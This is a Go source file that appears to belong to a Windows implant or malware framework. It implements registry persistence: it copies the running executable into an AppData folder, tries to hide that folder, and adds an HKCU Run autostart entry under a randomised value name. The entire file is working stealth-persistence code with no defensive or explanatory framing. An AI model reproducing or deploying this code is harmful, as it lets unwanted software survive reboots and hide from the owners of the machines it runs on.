//go:build windows && persist_registry
// +build windows,persist_registry

package persistence

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func init() {
	persistInstallFns = append(persistInstallFns, installRegistryFull)
}

func installRegistryFull(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}
	return installRegistry(targetPath)
}

func installRegistry(targetPath string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open HKCU Run key: %w", err)
	}
	defer k.Close()

	names, _ := k.ReadValueNames(0)
	for _, name := range names {
		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix)) {
			return k.SetStringValue(name, fmt.Sprintf(`"%s"`, targetPath))
		}
	}

	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return fmt.Errorf("failed to generate registry value name: %w", err)
	}
	valueName := registryValuePrefix + hex.EncodeToString(b)
	return k.SetStringValue(valueName, fmt.Sprintf(`"%s"`, targetPath))
}
